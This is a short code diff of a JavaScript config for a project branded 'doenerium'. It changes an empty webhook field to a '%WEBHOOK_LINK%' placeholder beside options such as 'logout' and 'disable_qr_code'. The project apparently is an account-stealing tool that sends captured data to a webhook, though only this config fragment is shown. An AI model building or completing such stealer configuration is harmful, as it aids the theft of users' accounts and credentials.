@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "doenerium",
 
-    webhook: "",
+    webhook: "%WEBHOOK_LINK%",
 
     logout: true,
     disable_qr_code: true,
